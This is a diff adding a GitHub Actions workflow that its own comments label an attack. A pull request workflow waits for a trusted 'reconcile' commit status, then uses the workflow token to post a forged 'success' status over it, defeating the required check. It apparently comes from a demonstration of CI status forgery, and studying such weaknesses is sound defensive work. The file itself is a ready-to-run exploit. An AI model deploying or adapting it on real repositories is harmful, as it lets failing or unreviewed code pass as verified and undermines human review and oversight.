@@ -1,0 +1,33 @@
+name: forge
+
+# ATTACK, second form. The rename in execute.yml did not stop the trusted
+# workflow_run, and its later failure overwrote the first forgery (the newest
+# status for a context wins). So this PR-defined workflow waits for the trusted
+# verdict and posts over it. Nothing on the default branch can stop a same-repo
+# PR from adding this file.
+
+on:
+  pull_request:
+
+permissions:
+  statuses: write
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: wait for the trusted verdict, then post over it
+        env:
+          GH_TOKEN: ${{ github.token }}
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+        run: |
+          for i in $(seq 1 72); do
+            n=$(gh api "repos/$GITHUB_REPOSITORY/commits/$HEAD_SHA/statuses" \
+              --jq '[.[] | select(.context=="reconcile" and (.description | test("forged") | not))] | length')
+            if [ "$n" -gt 0 ]; then echo "trusted verdict present after ~$((i*5))s"; break; fi
+            sleep 5
+          done
+          sleep 3
+          gh api --method POST "repos/$GITHUB_REPOSITORY/statuses/$HEAD_SHA" \
+            -f state=success -f context=reconcile \
+            -f description="receipt sha256:forged-after-the-trusted-verdict"
